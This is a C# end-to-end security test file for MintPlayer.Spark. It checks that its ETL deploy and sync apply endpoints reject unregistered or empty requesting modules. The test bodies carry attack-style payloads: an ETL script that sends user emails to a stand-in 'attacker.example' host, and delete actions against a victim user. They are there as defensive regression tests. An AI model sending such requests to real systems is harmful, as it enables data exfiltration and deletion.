using System.Net;
using System.Net.Http.Json;
using MintPlayer.Spark.E2E.Tests._Infrastructure;

namespace MintPlayer.Spark.E2E.Tests.Security;

/// <summary>
/// R2-C1 / R2-C2 — /spark/etl/deploy and /spark/sync/apply are cross-module endpoints
/// that previously shipped with no authentication at all. Round 2 gates them behind
/// mTLS. Fleet runs in Development mode (ClientCertificate.Mode = Auto resolves to
/// Development), so the cert thumbprint check is relaxed but the endpoint must still
/// refuse calls whose RequestingModule isn't registered in SparkModules.
///
/// The cross-side production check (cert thumbprint mismatch) is tested in a unit
/// test on ModuleCertificateValidator — exercising it end-to-end would require
/// per-process cert provisioning + Kestrel reconfiguration, out of scope here.
/// </summary>
[Collection(FleetE2ECollection.Name)]
public class ReplicationEndpointAuthTests
{
    private readonly FleetE2ECollectionFixture _fixture;
    public ReplicationEndpointAuthTests(FleetE2ECollectionFixture fixture) => _fixture = fixture;

    [Fact]
    public async Task Unauth_post_etl_deploy_with_unknown_requesting_module_is_refused()
    {
        using var http = SparkClientFactory.CreateHttpClient(_fixture.Host);

        var body = new
        {
            RequestingModule = "Attacker-Not-Registered",
            TargetDatabase = "victim",
            TargetUrls = new[] { "http://attacker.example/raven" },
            Scripts = new[]
            {
                new
                {
                    SourceCollection = "Users",
                    Script = "loadToUsers({Email: this.Email})",
                }
            }
        };

        var response = await http.PostAsJsonAsync("/spark/etl/deploy", body);

        // Development mode still verifies the module is registered — unknown
        // module → 403. (Production mode also returns 403 for thumbprint mismatch.)
        // Critically: NOT 200. The previous behavior was "no check at all".
        response.StatusCode.Should().BeOneOf([HttpStatusCode.Forbidden, HttpStatusCode.Unauthorized],
            "ETL deployment must reject unknown requesting modules");
    }

    [Fact]
    public async Task Unauth_post_sync_apply_with_unknown_requesting_module_is_refused()
    {
        using var http = SparkClientFactory.CreateHttpClient(_fixture.Host);

        var body = new
        {
            RequestingModule = "Attacker-Not-Registered",
            Actions = new[]
            {
                new
                {
                    Collection = "SparkUsers",
                    DocumentId = "users/victim",
                    ActionType = "Delete",
                }
            }
        };

        var response = await http.PostAsJsonAsync("/spark/sync/apply", body);

        response.StatusCode.Should().BeOneOf([HttpStatusCode.Forbidden, HttpStatusCode.Unauthorized],
            "sync apply must reject unknown requesting modules — was previously fully unauthenticated");
    }

    [Fact]
    public async Task Post_sync_apply_with_empty_requesting_module_is_refused()
    {
        using var http = SparkClientFactory.CreateHttpClient(_fixture.Host);

        var body = new
        {
            RequestingModule = "",
            Actions = new[]
            {
                new
                {
                    Collection = "SparkUsers",
                    DocumentId = "users/victim",
                    ActionType = "Delete",
                }
            }
        };

        var response = await http.PostAsJsonAsync("/spark/sync/apply", body);

        response.StatusCode.Should().BeOneOf([HttpStatusCode.Forbidden, HttpStatusCode.Unauthorized],
            "empty RequestingModule must be refused even before module-registration lookup");
    }
}
